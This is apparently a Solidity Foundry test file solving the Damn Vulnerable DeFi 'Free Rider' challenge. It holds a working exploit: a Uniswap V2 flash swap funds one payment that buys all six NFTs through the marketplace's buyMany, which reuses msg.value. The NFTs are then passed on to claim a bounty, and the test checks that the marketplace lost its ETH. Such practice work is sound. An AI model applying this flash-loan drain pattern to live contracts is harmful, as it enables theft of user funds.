// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.13;

import {Test, console} from "forge-std/Test.sol";

import {FreeRiderNFTMarketplace} from "../src/free-rider/FreeRiderNFTMarketplace.sol";
import {FreeRiderRecovery, IERC721Receiver} from "../src/free-rider/FreeRiderRecovery.sol";
import {WETH9} from "../src/WETH.sol";
import {DamnValuableToken} from "../src/DamnValuableToken.sol";
import {DamnValuableNFT} from "../src/DamnValuableNFT.sol";
import {IUniswapV2Router, IUniswapV2Factory, IUniswapV2Pair} from "../src/interface/uniswapV2.sol";

contract HelpUtils is IERC721Receiver {
    address admin;
    address pairAddress;
    address devsContract;
    WETH9 weth;
    FreeRiderNFTMarketplace marketplace;
    DamnValuableNFT nft;

    constructor(
        address _devsContract,
        WETH9 _weth,
        FreeRiderNFTMarketplace _marketplace,
        DamnValuableNFT _nft
    ) payable {
        admin = msg.sender;
        devsContract = _devsContract;
        weth = _weth;
        marketplace = _marketplace;
        nft = _nft;
        // weth.deposit{value: msg.value}();
    }

    function uniswapV2Call(
        address sender,
        uint256 amount0,
        uint256 amount1,
        bytes calldata data
    ) external {
        uint256[] memory tokenIds = new uint256[](6);
        for (uint256 i = 0; i < 6; ) {
            tokenIds[i] = i;
            unchecked {
                ++i;
            }
        }
        weth.withdraw(15 ether);
        marketplace.buyMany{value: 15 ether}(tokenIds);

        for (uint256 i = 0; i < 6; ) {
            nft.safeTransferFrom(
                address(this),
                devsContract,
                tokenIds[i],
                abi.encode(address(this))
            );
            unchecked {
                ++i;
            }
        }

        weth.deposit{value: 16 ether}();

        // 0.3% fees
        uint256 fee = ((amount0 * 3) / 997) + 1;
        uint256 amountToRepay = amount0 + fee;

        weth.transfer(pairAddress, amountToRepay);

        (bool ok, ) = admin.call{value: address(this).balance}("");
        require(ok, "send ETH failed");
    }

    function borrowToken(address _pairAddress) public {
        pairAddress = _pairAddress;
        IUniswapV2Pair(_pairAddress).swap(15 ether, 0, address(this), "0x00");
    }

    receive() external payable {}

    function onERC721Received(
        address /*operator*/,
        address /*from*/,
        uint /*tokenId*/,
        bytes calldata /*data*/
    ) external pure override returns (bytes4) {
        return IERC721Receiver.onERC721Received.selector;
    }
}

contract FreeRiderTest is Test {
    // NaiveReceiverLenderPool pool;
    // FlashLoanReceiver receiver;
    WETH9 weth;
    DamnValuableToken token;
    IUniswapV2Factory uniswapV2Factory;
    IUniswapV2Router uniswapV2Router;
    IUniswapV2Pair uniswapV2Pair;
    FreeRiderNFTMarketplace marketplace;
    DamnValuableNFT nft;
    FreeRiderRecovery devsContract;

    address deployer = makeAddr("deployer");
    address player = makeAddr("player");
    address devs = makeAddr("devs");

    // The NFT marketplace will have 6 tokens, at 15 ETH each
    uint256 NFT_PRICE = 15 ether;
    uint256 AMOUNT_OF_NFTS = 6;
    uint256 MARKETPLACE_INITIAL_ETH_BALANCE = 90 ether;

    uint256 PLAYER_INITIAL_ETH_BALANCE = 0.1 ether;

    uint256 BOUNTY = 45 ether;

    // Initial reserves for the Uniswap v2 pool
    uint256 UNISWAP_INITIAL_TOKEN_RESERVE = 15000 ether;
    uint256 UNISWAP_INITIAL_WETH_RESERVE = 9000 ether;

    modifier excuteByUser(address _user) {
        vm.startPrank(_user);
        _;
        vm.stopPrank();
    }

    function setUp() public {
        // Player starts with limited ETH balance
        deal(player, PLAYER_INITIAL_ETH_BALANCE);
        deal(
            deployer,
            UNISWAP_INITIAL_WETH_RESERVE + MARKETPLACE_INITIAL_ETH_BALANCE
        );
        deal(devs, BOUNTY);

        vm.startPrank(deployer);
        // Deploy token to be traded against WETH in Uniswap v2
        token = new DamnValuableToken();
        // Deploy WETH
        weth = new WETH9();

        // Deploy Uniswap Factory and Router
        uniswapV2Factory = IUniswapV2Factory(
            deployCode("./json/UniswapV2Factory.json", abi.encode(address(0)))
        );
        uniswapV2Router = IUniswapV2Router(
            deployCode(
                "./json/UniswapV2Router02.json",
                abi.encode(address(uniswapV2Factory), address(weth))
            )
        );

        // Approve tokens, and then create Uniswap v2 pair against WETH and add liquidity
        // The function takes care of deploying the pair automatically
        token.approve(address(uniswapV2Router), UNISWAP_INITIAL_TOKEN_RESERVE);
        uniswapV2Router.addLiquidityETH{value: UNISWAP_INITIAL_WETH_RESERVE}(
            address(token), // token to be traded against WETH
            UNISWAP_INITIAL_TOKEN_RESERVE, // amountTokenDesired
            0, // amountTokenMin
            0, // amountETHMin
            deployer, // to
            block.timestamp * 2 // deadline
        );

        // Get a reference to the created Uniswap pair
        uniswapV2Pair = IUniswapV2Pair(
            uniswapV2Factory.getPair(address(token), address(weth))
        );

        assertEq(uniswapV2Pair.token0(), address(weth));
        assertEq(uniswapV2Pair.token1(), address(token));
        assertGt(uniswapV2Pair.balanceOf(deployer), 0);

        // Deploy the marketplace and get the associated ERC721 token
        // The marketplace will automatically mint AMOUNT_OF_NFTS to the deployer (see `FreeRiderNFTMarketplace::constructor`)
        marketplace = new FreeRiderNFTMarketplace{
            value: MARKETPLACE_INITIAL_ETH_BALANCE
        }(AMOUNT_OF_NFTS);

        nft = marketplace.token();

        // ownership renounced
        assertEq(nft.owner(), address(0));
        assertEq(nft.rolesOf(address(marketplace)), nft.MINTER_ROLE());

        // Ensure deployer owns all minted NFTs. Then approve the marketplace to trade them.
        for (uint256 id = 0; id < AMOUNT_OF_NFTS; id++) {
            assertEq(nft.ownerOf(id), deployer);
        }
        nft.setApprovalForAll(address(marketplace), true);

        uint256[] memory tokenIds = new uint256[](6);
        uint256[] memory tokenPrices = new uint256[](6);
        for (uint256 i = 0; i < AMOUNT_OF_NFTS; ) {
            tokenIds[i] = i;
            tokenPrices[i] = NFT_PRICE;
            unchecked {
                ++i;
            }
        }

        // Open offers in the marketplace
        marketplace.offerMany(tokenIds, tokenPrices);
        assertEq(marketplace.offersCount(), 6);
        vm.stopPrank();

        vm.startPrank(devs);
        devsContract = new FreeRiderRecovery{value: BOUNTY}(
            player,
            address(nft)
        );
        vm.stopPrank();
    }

    function testExploit() public {
        vm.startPrank(player, player);

        HelpUtils help = new HelpUtils{value: PLAYER_INITIAL_ETH_BALANCE}(
            address(devsContract),
            weth,
            marketplace,
            nft
        );
        help.borrowToken(address(uniswapV2Pair));

        vm.stopPrank();

        // The devs extract all NFTs from its associated contract
        for (uint256 tokenId = 0; tokenId < AMOUNT_OF_NFTS; tokenId++) {
            vm.prank(devs);
            nft.transferFrom(address(devsContract), devs, tokenId);
            assertEq(nft.ownerOf(tokenId), devs);
        }
        // Exchange must have lost NFTs and ETH
        assertEq(marketplace.offersCount(), 0);
        assertLt(address(marketplace).balance, MARKETPLACE_INITIAL_ETH_BALANCE);

        // Player must have earned all ETH
        assertEq(address(devsContract).balance, 0);
        assertGt(player.balance, BOUNTY);
    }
}
